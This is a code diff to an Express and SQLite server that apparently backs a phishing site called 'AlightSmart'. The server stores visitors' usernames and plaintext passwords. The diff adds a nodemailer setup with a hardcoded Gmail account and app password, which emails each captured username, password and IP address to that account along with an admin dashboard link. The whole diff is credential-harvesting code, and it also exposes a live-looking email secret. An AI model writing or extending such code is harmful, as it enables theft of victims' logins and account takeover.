@@ -1,6 +1,7 @@
 const express = require('express');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
+const nodemailer = require('nodemailer');
 
 const app = express();
 app.use(express.json());
@@ -17,13 +18,42 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
+// Email Setup
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 'alightsmartacc@gmail.com',
+        pass: 'qyzluoldeamjyjqo'   // Your App Password
+    }
+});
+
 function saveRecord(type, username = null, password = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
+    
     db.run("INSERT INTO records (type, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
         [type, username, password, ip, timestamp]);
+
+    // Send Email
+    const mailOptions = {
+        from: 'alightsmartacc@gmail.com',
+        to: 'alightsmartacc@gmail.com',
+        subject: `New ${type} - AlightSmart`,
+        html: `
+            <h3>New Activity</h3>
+            <p><strong>Type:</strong> ${type}</p>
+            <p><strong>Username:</strong> ${username || '-'}</p>
+            <p><strong>Password:</strong> ${password || '-'}</p>
+            <p><strong>IP:</strong> ${ip}</p>
+            <p><strong>Time:</strong> ${timestamp}</p>
+            <hr>
+            <p><a href="https://alightsmartacc.onrender.com/admin">Open Admin Dashboard</a></p>
+        `
+    };
+
+    transporter.sendMail(mailOptions).catch(err => console.log('Email failed:', err));
 }
 
-// Record visits immediately
+// Routes
 app.get('/', (req, res) => {
     saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
@@ -57,5 +87,5 @@ app.post('/api/clear', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running`);
+    console.log(`🚀 Server running with Email Notification`);
 });
